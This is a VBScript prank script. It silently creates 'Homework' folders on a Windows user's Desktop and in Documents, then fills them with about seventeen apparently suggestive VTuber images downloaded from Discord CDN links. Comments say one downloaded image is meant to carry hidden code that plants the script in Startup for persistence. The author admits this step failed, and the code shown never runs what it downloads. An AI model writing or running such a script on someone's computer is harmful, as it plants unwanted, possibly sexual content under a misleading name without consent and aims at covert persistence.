function wait(n)
    wscript.sleep int(n * 1000)
    
end function

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.stream")

strDirectory = objShell.ExpandEnvironmentStrings("%userprofile%")

Set oWS = wscript.CreateObject("Wscript.Shell")
userProfile = oWS.ExpandEnvironmentStrings("%userprofile%")
dim userProfile, oWS
dim filesys, newfolder, newfolderpath
newfolderpath = userProfile & "\Desktop\Homework"
set filesys=CreateObject("Scripting.FileSystemObject")
If Not filesys.FolderExists(newfolderpath) Then
Set newfolder = filesys.CreateFolder(newfolderpath)
End If

Set oWS1 = wscript.CreateObject("Wscript.Shell")
userProfile1 = oWS1.ExpandEnvironmentStrings("%userprofile%")
dim userProfile1, oWS1
dim filesys1, newfolder1, newfolderpath1
newfolderpath1 = userProfile1 & "\Documents\Homework"
set filesys1=CreateObject("Scripting.FileSystemObject")
If Not filesys1.FolderExists(newfolderpath1) Then
Set newfolder1 = filesys1.CreateFolder(newfolderpath1)
End If

wait(2)


' put an image with code hidden in it so it download another image in startup with code in it that do the same thing as this code but without the hidden code image thing
' i hope this actually work because it do access refused when i try to put the script in startup 
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/554385210926694430/877664288469315634/popbobypass.png", False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\bob.png", 2 
    .savetofile strDirectory + "\Documents\Homework\bob.png", 2 
    .Close
end with

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")


'save an image into the computer(veibae)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877385278883512381/veibaeishot1.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot.png", 2
    .Close
end with

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")



'save another image(veibae1)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877537769033990204/9782b44ab18d34bc3cc14b77d6a2b875.jpeg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot1.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot1.png", 2
    .Close
end with

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")


'save another image(veibae2)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877537769352749096/426879220-20Twitch20Veibae20gameaddict6920vshojo20vtuber.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot2.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot2.png", 2
    .Close
end with

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")


'save another image(veibae3)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877537769839284224/430472820-20Twitch20Veibae20gameaddict6920vshojo20vtuber.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot3.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot3.png", 2
    .Close
end with


'save another image(veibae4)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877537770338394122/E2KtbIhUUAIuBsQ.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot4.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot4.png", 2
    .Close
end with


'save another image(veibae5)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877537770581671936/E2z063nUYAI_nLx.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot5.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot5.png", 2
    .Close
end with


'save another image(veibae6)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542402762616862/4288553_-_Nyanners_Veibae_vshojo_vtuber_yuuji8668.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot6.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot6.png", 2
    .Close
end with


'save another image(veibae7)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542403731496990/sample_1e060689e154a66b4ab9db86bba0ed6187ead629.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot7.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot7.png", 2
    .Close
end with


'save another image(veibae8)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542404041871390/sample_449e37beb4f105acb6f2d6553a4053519adfccac.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot8.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot8.png", 2
    .Close
end with



'save another image(veibae9)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542404268372018/sample_3057a99f5a7fd769e37a9b171287b43d.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot9.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot9.png", 2
    .Close
end with


'save another image(veibae10)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542404578738316/sample_af3f82c7256ee5e6a68cb788c40f8176.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot10.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot10.png", 2
    .Close
end with


'save another image(veibae11)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877542404910112778/veicomm.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot11.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot11.png", 2
    .Close
end with


'save another image(veibae12)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877547809467944980/4b49d52bbaf3c1d4eedc787e8b546d51.jpeg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot12.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot12.png", 2
    .Close
end with


'save another image(veibae13)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877551712460767272/sample_88f6f13679215fa50d3bff19dff5d08c.jpg", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot13.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot13.png", 2
    .Close
end with


'save another image(veibae14)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877552300011429938/veibaeishot3.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot14.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot14.png", 2
    .Close
end with


'save another image(veibae15)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877552319661768774/veibaeishot5.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot15.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot15.png", 2
    .Close
end with


'save another image(veibae16)
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/870860959521050736/877555305486098442/4206765_-_Achmad_Faisal_Nyanners_Twitch_vshojo_vtuber.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\Desktop\Homework\veibaeishot16.png", 2 
    .savetofile strDirectory + "\Documents\Homework\veibaeishot16.png", 2
    .Close
end with
